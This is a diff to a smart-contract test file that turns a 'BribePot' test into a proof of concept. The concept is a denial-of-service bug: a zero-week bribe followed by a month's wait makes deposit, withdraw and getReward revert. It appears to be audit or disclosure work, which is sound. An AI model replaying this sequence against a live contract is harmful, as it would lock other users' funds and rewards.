@@ -329,7 +329,7 @@ describe("BribePot", function () {
       expect(bribeDetail.startWeek).to.equal(expectedStartWeek);
       expect(bribeDetail.endWeek).to.equal(expectedEndWeek);
     });
-    it("should not allow users to bribe if numOfWeeks is zero", async function () {
+    it.only("should check if the DOS bug exists", async function () {
       const gvAmount = parseEther("100");
 
       //  deposit to pot
@@ -351,16 +351,36 @@ describe("BribePot", function () {
       });
 
       // adding bribe amount to pot with numOfWeeks 0 should revert
+      await contracts.bribePot
+        .connect(signers.briber)
+        .bribe(bribePerWeek, rcaVaultAddress, numOfWeeks, {
+          deadline,
+          v,
+          r,
+          s,
+        });
+
+      // move 1 month
+      await fastForward(TIME_IN_SECS.month);
+      await mine();
+
       await expect(
         contracts.bribePot
-          .connect(signers.briber)
-          .bribe(bribePerWeek, rcaVaultAddress, numOfWeeks, {
-            deadline,
-            v,
-            r,
-            s,
-          })
-      ).to.revertedWith("number of weeks can't be zero");
+          .connect(signers.gvToken)
+          .deposit(aliceAddress, gvAmount)
+      ).to.reverted;
+
+      await expect(
+        contracts.bribePot
+          .connect(signers.gvToken)
+          .withdraw(aliceAddress, gvAmount)
+      ).to.reverted;
+
+      await expect(
+        contracts.bribePot
+          .connect(signers.gvToken)
+          .getReward(aliceAddress, true)
+      ).to.reverted;
     });
     it("should not allow user to have multiple bribe for same vault", async function () {
       // call deposit
